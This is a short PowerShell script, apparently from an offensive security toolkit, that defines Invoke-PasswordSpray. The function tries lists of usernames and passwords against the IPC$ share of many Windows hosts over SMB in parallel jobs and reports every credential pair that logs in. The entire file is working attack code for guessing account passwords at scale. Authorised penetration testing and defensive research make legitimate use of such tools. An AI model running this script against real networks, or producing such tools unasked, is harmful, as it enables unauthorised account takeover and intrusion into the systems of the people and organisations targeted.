<#
  .SYNOPSIS
    Execute a password spraying attack.
  .PARAMETER Targets
    Specify one target, a targets file, or a comma delimited list of targets.
  .PARAMETER Users
    Specify one user, a users file, or a comma delimited list of users.
  .PARAMETER Passwords
    Specify one password, a password file, a comma delimited list of passwords.
  .NOTES
    Author: Luke Baggett
    Date: August 6, 2014
#>
function Invoke-PasswordSpray
{
  param(
    [Parameter(Mandatory=$True)]$Targets,
    [Parameter(Mandatory=$True)]$Users,
    [Parameter(Mandatory=$True)]$Passwords
  )

  $Parameters = @("Targets","Users","Passwords")
  foreach($Parameter in $Parameters)
  {
    if((Test-Path (Get-Variable -Name $Parameter -ValueOnly)) -eq $True)
    {
      Set-Variable -Name $Parameter -Value (Get-Content (Get-Variable -Name $Parameter -ValueOnly))
    }
  }

  $Jobs = @()
  $ScriptBlock = {
    param(
      $Target,
      $Users,
      $Passwords
    )
    $Result=@()
    foreach($User in $Users)
    {
      foreach($Password in $Passwords)
      {
        if((New-SmbMapping -RemotePath \\$Target\IPC$ -UserName $User -Password $Password 2>&1).Status -eq "OK")
        {
          $Result += ((Get-Date -Format [hh:mm:ss]) + " " + $Target + ":" + $User + ":" + $Password)
          Remove-SmbMapping -RemotePath \\$Target\IPC$ -Force -Confirm 2>&1 | Out-Null
        }
      }
    }
    return $Result
  }

  Write-Host ((Get-Date -Format [hh:mm:ss]) + " Starting Attack... ")
  foreach($Target in $Targets)
  {
    $Arguments = @($Target,$Users,$Passwords)
    $Jobs += (Start-Job $ScriptBlock -ArgumentList $Arguments).Name
  }

  foreach($JobName in $Jobs)
  {
    foreach($Result in (Wait-Job -Name $JobName | Receive-Job)){$Result}
    Remove-Job -Name $JobName -Force
    Remove-SmbMapping -RemotePath \\$JobName[0]\IPC$ -Force -Confirm
  }
  Write-Host ((Get-Date -Format [hh:mm:ss]) + " All Jobs Complete. ")
}